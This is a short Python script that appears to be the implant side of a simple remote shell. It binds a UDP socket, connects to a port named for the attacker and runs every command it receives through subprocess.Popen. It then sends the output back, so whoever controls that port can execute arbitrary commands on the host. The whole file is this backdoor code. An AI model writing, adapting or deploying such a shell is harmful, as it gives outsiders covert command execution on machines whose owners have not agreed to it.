import socket
from common import host, port, port_attacker, loads, dumps
import json
import subprocess

listener = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

listener.bind((host, port))
listener.connect((host, port_attacker))


def exec_(b: bytes):
    msg = loads(b)
    # func = getattr(subprocess, msg.get("type", "Popen"))
    func = subprocess.Popen
    resp = []
    args = msg.get("args")
    print("Executing:", *args)
    try:
        proc = func(args, stdout=subprocess.PIPE)
        for line in proc.stdout.readlines():
            if not line:
                break
            pr = line.decode().strip()
            print(pr)
            resp.append(pr)
    except Exception as e:
        resp.extend(("Error:", str(e)))
    return dumps(resp)


def run():
    while True:
        try:
            (data, _addr) = listener.recvfrom(4096)
            listener.send(exec_(data))
        except KeyboardInterrupt:
            listener.close()
            print("Quitting")
            break


run()
